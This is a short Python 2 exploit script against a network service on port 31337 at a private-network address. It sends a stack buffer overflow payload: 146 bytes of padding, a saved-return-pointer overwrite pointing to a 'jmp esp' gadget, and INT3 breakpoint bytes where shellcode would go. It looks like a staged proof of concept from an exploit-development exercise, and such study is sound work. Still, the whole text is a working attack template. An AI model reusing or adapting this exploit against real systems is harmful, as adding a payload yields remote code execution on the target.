#!/usr/bin/env python2
import socket
import struct

RHOST = "192.168.1.139"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024
offset_srp = 146

ptr_jmp_esp = 0x080414C3

buf = ""
buf += "A"*(offset_srp - len(buf)) # padding
buf += struct.pack("<I", ptr_jmp_esp) # SRP overwrite
buf += "\xCC\xCC\xCC\xCC" # ESP points here
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send(buf)